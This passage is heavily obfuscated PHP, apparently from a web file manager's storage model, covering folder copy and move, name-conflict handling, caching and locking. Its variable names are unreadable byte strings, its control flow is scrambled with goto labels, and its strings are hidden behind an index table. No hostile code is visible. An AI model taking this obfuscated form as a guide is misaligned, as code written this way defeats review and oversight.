Model($bñË…¤Ãó«[193])->linkAdd($d®¨Š±áëà[$bñË…¤Ãó«[529]]); $this->folderSizeReset($c‚¡ ëÎĞÒ); goto c×¨ÍîÏµÊ; dß„âÏÙ: if (!$EÅëÏ‹²‡Ú || !$b³÷½èó´ || $b³÷½èó´[$bñË…¤Ãó«[403]] != $bñË…¤Ãó«[87]) { return !1; } if ($this->isParentOf($dÔø‹í´îÛ, $c‚¡ ëÎĞÒ)) { return !1; } $F‡—·ÍÚŒ‹ = $AİÄÚ‹«ë‹ ? $AİÄÚ‹«ë‹ : $EÅëÏ‹²‡Ú[$bñË…¤Ãó«[28]]; goto d¾Õ­¢²Ã; c×¨ÍîÏµÊ: $this->updateModifyTime($c‚¡ ëÎĞÒ); return $a¡×†è¸áñ; goto E‰­åëˆ•²; A®çÓá¤ºÑ: $this->_childrenListClear(); $this->lockCopyEnd($dÔø‹í´îÛ); $this->lockWriteEnd($c‚¡ ëÎĞÒ, $F‡—·ÍÚŒ‹); goto cö°ÓË‚Ó; a¾âŞ‡¿œË: $this->targetIsDelete = intval($EÅëÏ‹²‡Ú[$bñË…¤Ãó«[423]]); $d£‡Ô…ËÃ = $this->fileNameExistCache($c‚¡ ëÎĞÒ, $EÅëÏ‹²‡Ú[$bñË…¤Ãó«[28]]); $a¡×†è¸áñ = $this->_copy($dÔø‹í´îÛ, $c‚¡ ëÎĞÒ, $C¯÷ÚÀÀ“Æ, $d®¨Š±áëà, !0, $AİÄÚ‹«ë‹); goto A®çÓá¤ºÑ; cö°ÓË‚Ó: if ($EÅëÏ‹²‡Ú[$bñË…¤Ãó«[403]] == $bñË…¤Ãó«[87] && $d£‡Ô…ËÃ == $a¡×†è¸áñ) { $this->folderSizeResetChildren($d£‡Ô…ËÃ); } Model($bñË…¤Ãó«[532])->addAll($d®¨Š±áëà[$bñË…¤Ãó«[530]], array(), !0); if ($d£‡Ô…ËÃ != $a¡×†è¸áñ || $EÅëÏ‹²‡Ú[$bñË…¤Ãó«[403]] == $bñË…¤Ãó«[87]) { Model($bñË…¤Ãó«[533])->eventCopy($a¡×†è¸áñ); } goto eË¸ÛôÆ; d¾Õ­¢²Ã: $this->lockCopyStart($dÔø‹í´îÛ); $this->lockWriteStart($c‚¡ ëÎĞÒ, $F‡—·ÍÚŒ‹); $d®¨Š±áëà = array($bñË…¤Ãó«[529] => array(), $bñË…¤Ãó«[530] => array(), $bñË…¤Ãó«[531] => array()); goto a¾âŞ‡¿œË; E‰­åëˆ•²: } private function _copy($D´„îØÖêĞ, $eå¼†Ò¶ó•, $cÃãİÌö»ï, &$aõ¯„°ÛÄÀ, $e£Ø†ŠéĞÄ, $cñ·ˆŒóÒ = '') { goto d×ƒßŠ„—Ê; eµ‚ùç·Ğ²: $cãª©•·§¼ = $cñ·ˆŒóÒ ? $cñ·ˆŒóÒ : $AÃ¿«ÁÔù[$CÃÅ‘ÅŠ´„[28]]; $E¶¾‡ë»à = $this->fileNameExistCache($eå¼†Ò¶ó•, $cãª©•·§¼); if ($e£Ø†ŠéĞÄ) { $this->_childrenAllMake($D´„îØÖêĞ); if ($a¿´ÛùÖº && $E¶¾‡ë»à) { $this->_childrenAllMake($E¶¾‡ë»à); } } goto dŸò×»Êé; dâİ¡ïŞ†®: return $f²ÛŒäÆë; goto A†õ©ÌâäÏ; d×ƒßŠ„—Ê: $CÃÅ‘ÅŠ´„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $AÃ¿«ÁÔù = $this->sourceInfoCache($D´„îØÖêĞ); $a¿´ÛùÖº = $AÃ¿«ÁÔù[$CÃÅ‘ÅŠ´„[403]] == $CÃÅ‘ÅŠ´„[87]; goto eµ‚ùç·Ğ²; dŸò×»Êé: if (!$E¶¾‡ë»à) { return $this->_copyCreate($D´„îØÖêĞ, $eå¼†Ò¶ó•, $cãª©•·§¼, $aõ¯„°ÛÄÀ); } $f²ÛŒäÆë = $E¶¾‡ë»à; if ($a¿´ÛùÖº) { if ($cÃãİÌö»ï == REPEAT_RENAME_FOLDER) { $cãª©•·§¼ = $this->fileNameAutoCache($eå¼†Ò¶ó•, $cãª©•·§¼, $cÃãİÌö»ï, $a¿´ÛùÖº); $f²ÛŒäÆë = $this->_copyCreate($D´„îØÖêĞ, $eå¼†Ò¶ó•, $cãª©•·§¼, $aõ¯„°ÛÄÀ); } else { $B¹¬ö®È‚¯ = $this->_childrenList($D´„îØÖêĞ); foreach ($B¹¬ö®È‚¯ as $CŠ¹˜¬±‡„) { $this->_copy($CŠ¹˜¬±‡„[$CÃÅ‘ÅŠ´„[395]], $E¶¾‡ë»à, $cÃãİÌö»ï, $aõ¯„°ÛÄÀ, !1); } } } else { if ($cÃãİÌö»ï == REPEAT_RENAME || $cÃãİÌö»ï == REPEAT_RENAME_FOLDER) { $cãª©•·§¼ = $this->fileNameAutoCache($eå¼†Ò¶ó•, $cãª©•·§¼, $cÃãİÌö»ï, $a¿´ÛùÖº); $f²ÛŒäÆë = $this->_copyCreate($D´„îØÖêĞ, $eå¼†Ò¶ó•, $cãª©•·§¼, $aõ¯„°ÛÄÀ); } else { if ($cÃãİÌö»ï == REPEAT_REPLACE) { $BÈ‘²ğŠæ = $this->sourceInfoCache($E¶¾‡ë»à); $dÓÒ«ã—·İ = $this->fileHistory($BÈ‘²ğŠæ, $AÃ¿«ÁÔù[$CÃÅ‘ÅŠ´„[447]], $AÃ¿«ÁÔù[$CÃÅ‘ÅŠ´„[78]]); if ($dÓÒ«ã—·İ) { $aõ¯„°ÛÄÀ[$CÃÅ‘ÅŠ´„[529]][] = $AÃ¿«ÁÔù[$CÃÅ‘ÅŠ´„[447]]; } } else { if ($cÃãİÌö»ï == REPEAT_SKIP) { } } } Hook::trigger($CÃÅ‘ÅŠ´„[534], array($CÃÅ‘ÅŠ´„[535], $AÃ¿«ÁÔù, 0)); } goto dâİ¡ïŞ†®; A†õ©ÌâäÏ: } private function _copyCreate($dõ÷Ó•²Ê­, $a‡«Š¨ ·Ğ, $bïÕó­µ®×, &$Eßª²™¤ˆ†) { goto bŒ«ãìÜÈÇ; cîš‡µ¨”•: $eÔóÖÑ©[$dõ÷Ó•²Ê­] = $eõ›ÖôğöÉ; $dÁ¬š”» = array(); $EÂ¨¶‚Šª¾ = array(); goto c‰õ´‡ÌäØ; eËŠø²––: $céÑÒô©Š” = $this->_makeItemData($FôïÚÂŞù, $c‰É—ˆ×‰ë, $bïÕó­µ®×); Hook::trigger($bŒÓßÜêŞ·[536], $céÑÒô©Š”); Hook::trigger($bŒÓßÜêŞ·[537], array($bŒÓßÜêŞ·[538], $céÑÒô©Š”, 0)); goto EçÁ×Ø©ª“; c„ô­Ÿ¦ù‡: $D„¶ï•† = $this->sourceInfo($eõ›ÖôğöÉ); foreach ($e¾¿×ƒ°ÏÚ as $BÇãİˆ…°Ë) { $BóÕ¹®ŒŠ¹ = $this->_makeItemData($BÇãİˆ…°Ë, $D„¶ï•†, $BÇãİˆ…°Ë[$bŒÓßÜêŞ·[28]]); $BóÕ¹®ŒŠ¹[$bŒÓßÜêŞ·[487]] = $BÇãİˆ…°Ë[$bŒÓßÜêŞ·[487]]; $CÁçÌ¬éÏ¹[] = $BóÕ¹®ŒŠ¹; } $this->chunkEventSet($bŒÓßÜêŞ·[539], array($bŒÓßÜêŞ·[540], $céÑÒô©Š”, $a‘¨¸¿Æ²é)); goto Cêåî‘œ ¿; Cêåî‘œ ¿: $this->addAll($CÁçÌ¬éÏ¹, array(), !1); $D±…½ÃÚË = $this->where(array($bŒÓßÜêŞ·[478] => $eõ›ÖôğöÉ))->select(); $eÔóÖÑ© = $this->_childrenMakeRelation($e¾¿×ƒ°ÏÚ, $D±…½ÃÚË); goto cîš‡µ¨”•; c‰õ´‡ÌäØ: foreach ($D±…½ÃÚË as $BÇãİˆ…°Ë) { $e—ùİÎ¹íĞ = $BÇãİˆ…°Ë[$bŒÓßÜêŞ·[395]]; $E¼ğ›ÏĞ† = $this->_childrenMatch($eÔóÖÑ©, $BÇãİˆ…°Ë, $D„¶ï•†); $dÁ¬š”»[] = array($bŒÓßÜêŞ·[395], $e—ùİÎ¹íĞ, $bŒÓßÜêŞ·[478], $E¼ğ›ÏĞ†[$bŒÓßÜêŞ·[478]]); $EÂ¨¶‚Šª¾[] = array($bŒÓßÜêŞ·[395], $e—ùİÎ¹íĞ, $bŒÓßÜêŞ·[487], $E¼ğ›ÏĞ†[$bŒÓßÜêŞ·[487]]); $this->_copyApplyMeta($BÇãİˆ…°Ë, $Eßª²™¤ˆ†); if ($BÇãİˆ…°Ë[$bŒÓßÜêŞ·[403]] != $bŒÓßÜêŞ·[87]) { $Eßª²™¤ˆ†[$bŒÓßÜêŞ·[529]][] = $BÇãİˆ…°Ë[$bŒÓßÜêŞ·[447]]; } } $this->chunkEventSet($bŒÓßÜêŞ·[541], array($bŒÓßÜêŞ·[542], $céÑÒô©Š”, $a‘¨¸¿Æ²é)); $this->saveAll($dÁ¬š”»); goto a²ÖÎÑ Ã¦; Cí˜Ù ‚–Œ: $this->_childrenListAll($dõ÷Ó•²Ê­, $e¾¿×ƒ°ÏÚ); $a‘¨¸¿Æ²é = count($e¾¿×ƒ°ÏÚ); if ($a‘¨¸¿Æ²é == 0) { return $eõ›ÖôğöÉ; } goto c„ô­Ÿ¦ù‡; EçÁ×Ø©ª“: $eõ›ÖôğöÉ = $this->add($céÑÒô©Š”); $a¹å‚÷±ô® = array($bŒÓßÜêŞ·[395] => $eõ›ÖôğöÉ, $bŒÓßÜêŞ·[28] => $bïÕó­µ®×); $this->_copyApplyMeta($a¹å‚÷±ô®, $Eßª²™¤ˆ†); goto CÂà¥­ñ†‚; CÂà¥­ñ†‚: if ($FôïÚÂŞù[$bŒÓßÜêŞ·[403]] != $bŒÓßÜêŞ·[87]) { $Eßª²™¤ˆ†[$bŒÓßÜêŞ·[529]][] = $FôïÚÂŞù[$bŒÓßÜêŞ·[447]]; return $eõ›ÖôğöÉ; } $e¾¿×ƒ°ÏÚ = array(); $CÁçÌ¬éÏ¹ = array(); goto Cí˜Ù ‚–Œ; a²ÖÎÑ Ã¦: $this->chunkEventSet($bŒÓßÜêŞ·[543], array($bŒÓßÜêŞ·[544], $céÑÒô©Š”, $a‘¨¸¿Æ²é)); $this->saveAll($EÂ¨¶‚Šª¾); return $eõ›ÖôğöÉ; goto bÍ‡¢¡åÏ; bŒ«ãìÜÈÇ: $bŒÓßÜêŞ· =& $_SERVER[ÒÆ›ÆØÎ¾]; $FôïÚÂŞù = $this->sourceInfoCache($dõ÷Ó•²Ê­); $c‰É—ˆ×‰ë = $this->sourceInfoCache($a‡«Š¨ ·Ğ); goto eËŠø²––; bÍ‡¢¡åÏ: } private function _childrenMakeRelation($FôğˆÑÊ”•, $cÎ”îš¤Ó) { $d£óÙŠƒ¿¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; $C¹ÀƒòÊ = array(); $C÷©óêì—£ = array(); foreach ($FôğˆÑÊ”• as $B…ƒ×Ùö¾) { $eÇÂˆø• = $B…ƒ×Ùö¾[$d£óÙŠƒ¿¨[28]] . $d£óÙŠƒ¿¨[8] . $B…ƒ×Ùö¾[$d£óÙŠƒ¿¨[487]]; $C¹ÀƒòÊ[$eÇÂˆø•] = $B…ƒ×Ùö¾[$d£óÙŠƒ¿¨[395]]; } foreach ($cÎ”îš¤Ó as $B…ƒ×Ùö¾) { $eÇÂˆø• = $B…ƒ×Ùö¾[$d£óÙŠƒ¿¨[28]] . $d£óÙŠƒ¿¨[8] . $B…ƒ×Ùö¾[$d£óÙŠƒ¿¨[487]]; $aøÎÛ“Íã” = $C¹ÀƒòÊ[$eÇÂˆø•]; $C÷©óêì—£[$aøÎÛ“Íã”] = $B…ƒ×Ùö¾[$d£óÙŠƒ¿¨[395]]; } return $C÷©óêì—£; } private function _childrenMatch($b¬îœ”ÌŞ³, $Då­Á÷¶‚², $cƒ­Ó‘†ÎÍ) { goto f¡“¡Ç½±Š; B´¿È“¹•ñ: foreach ($eÕ¹Ë‘ÙÖ as $ašˆˆ´¼ï) { if (isset($b¬îœ”ÌŞ³[$ašˆˆ´¼ï])) { $AŞ†Û‰Ø¬æ .= $b¬îœ”ÌŞ³[$ašˆˆ´¼ï] . $CÓíÊˆÆºš[545]; } } $AŞ†Û‰Ø¬æ = rtrim($AŞ†Û‰Ø¬æ, $CÓíÊˆÆºš[47]) . $CÓíÊˆÆºš[47]; $AÊß°¼âòº = $this->parentLevelArray($AŞ†Û‰Ø¬æ); goto F¤Õ‰÷Œ³; F¤Õ‰÷Œ³: $AÆ™à¯ÍŒ³ = $AÊß°¼âòº[count($AÊß°¼âòº) - 1]; return array($CÓíÊˆÆºš[478] => $AÆ™à¯ÍŒ³, $CÓíÊˆÆºš[487] => $AŞ†Û‰Ø¬æ); goto Aà•ù‹ÁŞâ; f¡“¡Ç½±Š: $CÓíÊˆÆºš =& $_SERVER[ÒÆ›ÆØÎ¾]; $AŞ†Û‰Ø¬æ = $cƒ­Ó‘†ÎÍ[$CÓíÊˆÆºš[487]]; $eÕ¹Ë‘ÙÖ = $this->parentLevelArray($Då­Á÷¶‚²[$CÓíÊˆÆºš[487]]); goto B´¿È“¹•ñ; Aà•ù‹ÁŞâ: } private function _makeItemData($B½×Õ¿àÅ™, $f‡ù‡ß÷ÄÑ, $A±•Íùà¯¤) { $e™äŸ¦ˆ­Ò =& $_SERVER[ÒÆ›ÆØÎ¾]; $AêÖãŞÚ²Ä = array($e™äŸ¦ˆ­Ò[546] => $B½×Õ¿àÅ™[$e™äŸ¦ˆ­Ò[403]], $e™äŸ¦ˆ­Ò[413] => $A±•Íùà¯¤, $e™äŸ¦ˆ­Ò[547] => $B½×Õ¿àÅ™[$e™äŸ¦ˆ­Ò[405]], $e™äŸ¦ˆ­Ò[448] => $B½×Õ¿àÅ™[$e™äŸ¦ˆ­Ò[447]], $e™äŸ¦ˆ­Ò[548] => $B½×Õ¿àÅ™[$e™äŸ¦ˆ­Ò[78]], $e™äŸ¦ˆ­Ò[549] => $f‡ù‡ß÷ÄÑ[$e™äŸ¦ˆ­Ò[404]], $e™äŸ¦ˆ­Ò[550] => $f‡ù‡ß÷ÄÑ[$e™äŸ¦ˆ­Ò[484]], $e™äŸ¦ˆ­Ò[551] => USER_ID, $e™äŸ¦ˆ­Ò[552] => USER_ID, $e™äŸ¦ˆ­Ò[394] => $f‡ù‡ß÷ÄÑ[$e™äŸ¦ˆ­Ò[395]], $e™äŸ¦ˆ­Ò[553] => $f‡ù‡ß÷ÄÑ[$e™äŸ¦ˆ­Ò[487]] . $f‡ù‡ß÷ÄÑ[$e™äŸ¦ˆ­Ò[395]] . $e™äŸ¦ˆ­Ò[47], $e™äŸ¦ˆ­Ò[417] => $B½×Õ¿àÅ™[$e™äŸ¦ˆ­Ò[84]], $e™äŸ¦ˆ­Ò[422] => 0, $e™äŸ¦ˆ­Ò[554] => $e™äŸ¦ˆ­Ò[33]); return $AêÖãŞÚ²Ä; } private function _copyApplyMeta($FéŞ‰Å‚®¿, &$d‘õ×’£½—) { $cí’è´àŞ… =& $_SERVER[ÒÆ›ÆØÎ¾]; $DŸªİÃÓó¤ = $FéŞ‰Å‚®¿[$cí’è´àŞ…[395]]; $Còƒ°£ÏŸ¤ = $FéŞ‰Å‚®¿[$cí’è´àŞ…[28]]; if (!isset($FéŞ‰Å‚®¿[$cí’è´àŞ…[555]]) || !$FéŞ‰Å‚®¿[$cí’è´àŞ…[555]] || $FéŞ‰Å‚®¿[$cí’è´àŞ…[555]] == $cí’è´àŞ…[191]) { $d‘õ×’£½—[$cí’è´àŞ…[531]][] = array($cí’è´àŞ…[395], $DŸªİÃÓó¤, $cí’è´àŞ…[555], short_id($DŸªİÃÓó¤)); } if (Input::check($Còƒ°£ÏŸ¤, $cí’è´àŞ…[556])) { $d‘õ×’£½—[$cí’è´àŞ…[530]][] = array($cí’è´àŞ…[395] => $DŸªİÃÓó¤, $cí’è´àŞ…[93] => $cí’è´àŞ…[444], $cí’è´àŞ…[372] => str_replace($cí’è´àŞ…[50], $cí’è´àŞ…[33], Pinyin::encode($Còƒ°£ÏŸ¤))); $d‘õ×’£½—[$cí’è´àŞ…[530]][] = array($cí’è´àŞ…[395] => $DŸªİÃÓó¤, $cí’è´àŞ…[93] => $cí’è´àŞ…[443], $cí’è´àŞ…[372] => Pinyin::encode($Còƒ°£ÏŸ¤, $cí’è´àŞ…[557])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($a±©“õçÛ„) { goto aÈ¼¨‰ËŒ•; aÈ¼¨‰ËŒ•: $bÚÆŞÂ— =& $_SERVER[ÒÆ›ÆØÎ¾]; $CÅ±Ëõõ†‡ = $this->sourceInfo($a±©“õçÛ„); $D›êÇò›óØ = $bÚÆŞÂ—[424]; goto BùÆé…š; Fñ½‰ÚÔ¤í: $fÒ»éãğ Œ = array_to_keyvalue($fÒ»éãğ Œ, $bÚÆŞÂ—[395]); foreach ($fÒ»éãğ Œ as $fÕîØéâÛ¨) { $f–Ò›Ü÷šÄ = $fÕîØéâÛ¨[$bÚÆŞÂ—[478]]; $a±©“õçÛ„ = $fÕîØéâÛ¨[$bÚÆŞÂ—[395]]; if (!isset($this->_childrenListCache[$a±©“õçÛ„]) && $fÕîØéâÛ¨[$bÚÆŞÂ—[403]] == $bÚÆŞÂ—[87]) { $this->_childrenListCache[$a±©“õçÛ„] = array(); } if (!isset($this->_childrenListCache[$f–Ò›Ü÷šÄ])) { $this->_childrenListCache[$f–Ò›Ü÷šÄ] = array(); } $this->_childrenListCache[$f–Ò›Ü÷šÄ][$a±©“õçÛ„] = $fÕîØéâÛ¨; $this->_childrenItemCache[$a±©“õçÛ„] = $fÕîØéâÛ¨; } goto eà”œØíÎº; BùÆé…š: $E¦Ò×À–Š = array($bÚÆŞÂ—[487] => array($bÚÆŞÂ—[512], $CÅ±Ëõõ†‡[$bÚÆŞÂ—[487]] . $a±©“õçÛ„ . $bÚÆŞÂ—[513]), $bÚÆŞÂ—[423] => $this->targetIsDelete); $fÒ»éãğ Œ = $this->field($D›êÇò›óØ)->where($E¦Ò×À–Š)->select(); if (!$fÒ»éãğ Œ) { return; } goto Fñ½‰ÚÔ¤í; eà”œØíÎº: } private function _childrenListAll($c»’„…­”Á, &$fÈ§ªÎÉªÈ) { $fÖ¹ñµÅ²± =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($this->_childrenListCache[$c»’„…­”Á])) { return; } $dİÌÉë†ùÂ = $this->_childrenListCache[$c»’„…­”Á]; foreach ($dİÌÉë†ùÂ as $EäÀ©ì¹á => $fğè†øæ—) { $fÈ§ªÎÉªÈ[$EäÀ©ì¹á] = $fğè†øæ—; if ($fğè†øæ—[$fÖ¹ñµÅ²±[403]] == $fÖ¹ñµÅ²±[87]) { $this->_childrenListAll($EäÀ©ì¹á, $fÈ§ªÎÉªÈ); } } } private function sourceInfoCache($dîõÎé¯¼½) { if (isset($this->_childrenItemCache[$dîõÎé¯¼½])) { return $this->_childrenItemCache[$dîõÎé¯¼½]; } return $this->sourceInfo($dîõÎé¯¼½); } private function _childrenList($d»Á‡î²·Í) { if (isset($this->_childrenListCache[$d»Á‡î²·Í])) { return $this->_childrenListCache[$d»Á‡î²·Í]; } return $this->_childrenListSelect($d»Á‡î²·Í); } private function _childrenListSelect($e—²çîÔ„ê) { goto e·ŒšöÃÜ; e·ŒšöÃÜ: $bë«÷†ŞØ =& $_SERVER[ÒÆ›ÆØÎ¾]; $D¹ÈÒêÀ‘é = array($bë«÷†ŞØ[478] => $e—²çîÔ„ê, $bë«÷†ŞØ[423] => $this->targetIsDelete); $Bõ°ŞÏíºƒ = $this->where($D¹ÈÒêÀ‘é)->select(); goto DÏÆ©Ÿ²ãä; dŒŠ†çÇõ: foreach ($aã¼ê‹Ô¡Ó as $e—²çîÔ„ê => $c¯¢Ü®›½Ä) { $this->_childrenItemCache[$e—²çîÔ„ê] = $c¯¢Ü®›½Ä; } return $aã¼ê‹Ô¡Ó; goto E¨÷ò¢š»„; DÏÆ©Ÿ²ãä: $Bõ°ŞÏíºƒ = $Bõ°ŞÏíºƒ ? $Bõ°ŞÏíºƒ : array(); $aã¼ê‹Ô¡Ó = array_to_keyvalue($Bõ°ŞÏíºƒ, $bë«÷†ŞØ[395]); $this->_childrenListCache[$e—²çîÔ„ê] = $aã¼ê‹Ô¡Ó; goto dŒŠ†çÇõ; E¨÷ò¢š»„: } private function fileNameExistCache($aÑŠàğšÏ–, $FÒİ½¤ÕãË) { $A­Ì—¤‚‘î =& $_SERVER[ÒÆ›ÆØÎ¾]; $FÒİ½¤ÕãË = strtolower($FÒİ½¤ÕãË); $aóÎº²ŸÒ“ = $this->_childrenList($aÑŠàğšÏ–); foreach ($aóÎº²ŸÒ“ as $b‹‰ö¬‚Ù) { if ($FÒİ½¤ÕãË == strtolower($b‹‰ö¬‚Ù[$A­Ì—¤‚‘î[28]])) { return $b‹‰ö¬‚Ù[$A­Ì—¤‚‘î[395]]; } } return !1; } private function fileNameAutoCache($a´«ƒ™Ïš, $C¶¡ ”ñ§, $A³œ·Œ½, $e¸¹‘À¥å‡) { $cìáƒ‹¸š =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÍ–µ¹êîº = $this->_childrenList($a´«ƒ™Ïš); $EÍ·Â¹‰©£ = array_to_keyvalue($eÍ–µ¹êîº, $cìáƒ‹¸š[33], $cìáƒ‹¸š[28]); return $this->fileNameAutoGet($EÍ·Â¹‰©£, $C¶¡ ”ñ§, $A³œ·Œ½, $e¸¹‘À¥å‡); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($eÇò“§í¢, $BÂ¼Û¢¦Â‹, $dÑÉÅ÷Œ = REPEAT_REPLACE, $EŠ¼¾“²´ì = '') { goto aÓ¶– ×İÌ; eÛÎ÷Ñ¥Âñ: $bà¼ç«Ç† = $this->fileNameExistCache($BÂ¼Û¢¦Â‹, $DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[28]]); $EîàË¡ğÃ = $this->_move($eÇò“§í¢, $BÂ¼Û¢¦Â‹, $dÑÉÅ÷Œ, $FøéŸç˜»‡, $EŠ¼¾“²´ì); $this->sourceCacheClear(); goto BË†¾¨Ë†Â; aÓ¶– ×İÌ: $c­Î¥ÂÆ„ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DŠ¬İ¿åĞÅ = $this->sourceInfo($eÇò“§í¢); $FìĞ‡È³Š¨ = $this->sourceInfo($BÂ¼Û¢¦Â‹); goto d‘…­÷“«Ğ; dÏËïÉ™¯¬: $this->updateModifyTime($AÁÆŸ—¢âª); Model($c­Î¥ÂÆ„[533])->eventMove($eÇò“§í¢, $DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[478]], $BÂ¼Û¢¦Â‹); Hook::trigger($c­Î¥ÂÆ„[559], $dÚˆ©î—¤³); goto a¯äÜ­Ûàä; BË†¾¨Ë†Â: if ($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[403]] == $c­Î¥ÂÆ„[87] && $bà¼ç«Ç†) { $this->folderSizeResetChildren($EîàË¡ğÃ); } Model($c­Î¥ÂÆ„[193])->linkAdd($FøéŸç˜»‡[$c­Î¥ÂÆ„[529]]); if ($bà¼ç«Ç† && $FøéŸç˜»‡[$c­Î¥ÂÆ„[560]]) { $this->removeNow($eÇò“§í¢, !1); } goto dõÉæ’; Fˆ±ˆì–›×: if (!$DŠ¬İ¿åĞÅ || !$FìĞ‡È³Š¨ || $FìĞ‡È³Š¨[$c­Î¥ÂÆ„[403]] != $c­Î¥ÂÆ„[87]) { return !1; } Hook::trigger($c­Î¥ÂÆ„[558], $dÚˆ©î—¤³); $this->targetIsDelete = intval($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[423]]); goto fÌ´·æˆˆ; e¾ÙÒŸ©ğ: $this->folderSizeReset($BÂ¼Û¢¦Â‹); $AÁÆŸ—¢âª = array($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[478]], $BÂ¼Û¢¦Â‹); if ($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[403]] == $c­Î¥ÂÆ„[87]) { $AÁÆŸ—¢âª[] = $eÇò“§í¢; } goto dÏËïÉ™¯¬; a¯äÜ­Ûàä: return $EîàË¡ğÃ; goto C…‹Ÿ‡ù¬Û; Aãù±†¹¡: $this->lockWriteStart($BÂ¼Û¢¦Â‹, $DÚ¢ğÙô”); $FøéŸç˜»‡ = array($c­Î¥ÂÆ„[529] => array(), $c­Î¥ÂÆ„[560] => !1); $this->clearShare($eÇò“§í¢, $BÂ¼Û¢¦Â‹); goto eÛÎ÷Ñ¥Âñ; dõÉæ’: $this->lockMoveEnd($eÇò“§í¢); $this->lockWriteEnd($BÂ¼Û¢¦Â‹, $DÚ¢ğÙô”); $this->folderSizeReset($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[478]]); goto e¾ÙÒŸ©ğ; fÌ´·æˆˆ: if ($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[478]] == $BÂ¼Û¢¦Â‹ && $EŠ¼¾“²´ì != $DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[28]]) { $Aïóƒµˆô = $this->fileNameExist($BÂ¼Û¢¦Â‹, $EŠ¼¾“²´ì); if ($Aïóƒµˆô && $DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[403]] == $c­Î¥ÂÆ„[191]) { goto CÙ«…ÁšËŒ; e¾–¼î›é: return $Aïóƒµˆô; goto c°ïùêø²¿; DºÜ¤¶ßÇò: $this->removeNow($eÇò“§í¢, !1); $this->folderSizeReset($BÂ¼Û¢¦Â‹); Hook::trigger($c­Î¥ÂÆ„[559], $dÚˆ©î—¤³); goto e¾–¼î›é; CÙ«…ÁšËŒ: $còí¥Š™æù = $this->sourceInfo($Aïóƒµˆô); $c…¹®å†ç = $this->fileHistory($còí¥Š™æù, $DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[447]], $DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[78]]); if (!$c…¹®å†ç) { Model($c­Î¥ÂÆ„[450])->remove($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[447]]); } goto DºÜ¤¶ßÇò; c°ïùêø²¿: } } $DÚ¢ğÙô” = $EŠ¼¾“²´ì ? $EŠ¼¾“²´ì : $DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[28]]; $this->lockMoveStart($eÇò“§í¢); goto Aãù±†¹¡; d‘…­÷“«Ğ: if ($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[478]] == $FìĞ‡È³Š¨[$c­Î¥ÂÆ„[395]]) { if ($DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[423]] == $c­Î¥ÂÆ„[87]) { Model($c­Î¥ÂÆ„[421])->restore(array($eÇò“§í¢)); } if (!$EŠ¼¾“²´ì || $EŠ¼¾“²´ì == $DŠ¬İ¿åĞÅ[$c­Î¥ÂÆ„[28]]) { return $eÇò“§í¢; } } $dÚˆ©î—¤³ = $this->pathInfoMore($eÇò“§í¢); if ($this->isParentOf($eÇò“§í¢, $BÂ¼Û¢¦Â‹)) { return !1; } goto Fˆ±ˆì–›×; C…‹Ÿ‡ù¬Û: } private function _move($C˜™ïÄÇ™ì, $C†ããğ¼Ëª, $d®Œ¥ÁÍ‚, &$FïÆ×¸„‰®, $F“ˆµæÛë¹ = '') { goto FÍ†‘Ö‰«Ò; FÍ†‘Ö‰«Ò: $E¢å…„ñ® =& $_SERVER[ÒÆ›ÆØÎ¾]; $Eæ—Ìó“Ì = $this->sourceInfo($C˜™ïÄÇ™ì); $cñ‚ÇßÛ = $Eæ—Ìó“Ì[$E¢å…„ñ®[403]] == $E¢å…„ñ®[87]; goto Cã™àãòåÒ; bª‹‰“©ƒ§: $fŒ±¶¶á²¼ = !1; if ($cñ‚ÇßÛ) { if ($d®Œ¥ÁÍ‚ == REPEAT_RENAME_FOLDER) { $CªÄøÏğŒ = $this->fileNameAuto($C†ããğ¼Ëª, $CªÄøÏğŒ, $d®Œ¥ÁÍ‚, $cñ‚ÇßÛ); $eùñ¸ˆŞ‰Ë = $this->_moveForce($C˜™ïÄÇ™ì, $C†ããğ¼Ëª, $CªÄøÏğŒ); } else { if ($d®Œ¥ÁÍ‚ == REPEAT_RENAME_FOLDER) { $d®Œ¥ÁÍ‚ = REPEAT_RENAME; } $Cá¸²±†¸— = $this->_childrenListSelect($C˜™ïÄÇ™ì); foreach ($Cá¸²±†¸— as $cÀùÎ‹øæä) { $this->_move($cÀùÎ‹øæä[$E¢å…„ñ®[395]], $B÷Ñ’ùÎ¡, $d®Œ¥ÁÍ‚, $FïÆ×¸„‰®); } $fŒ±¶¶á²¼ = !0; } } else { if ($d®Œ¥ÁÍ‚ == REPEAT_SKIP) { $fŒ±¶¶á²¼ = !0; } else { if ($d®Œ¥ÁÍ‚ == REPEAT_RENAME || $d®Œ¥ÁÍ‚ == REPEAT_RENAME_FOLDER) { $CªÄøÏğŒ = $this->fileNameAuto($C†ããğ¼Ëª, $CªÄøÏğŒ, $d®Œ¥ÁÍ‚, $cñ‚ÇßÛ); $eùñ¸ˆŞ‰Ë = $this->_moveForce($C˜™ïÄÇ™ì, $C†ããğ¼Ëª, $CªÄøÏğŒ); } else { if ($d®Œ¥ÁÍ‚ == REPEAT_REPLACE) { $cÕ¢Æ‘ğŠÀ = $this->sourceInfoCache($B÷Ñ’ùÎ¡); $cõË’‘œÊ» = $this->fileHistory($cÕ¢Æ‘ğŠÀ, $Eæ—Ìó“Ì[$E¢å…„ñ®[447]], 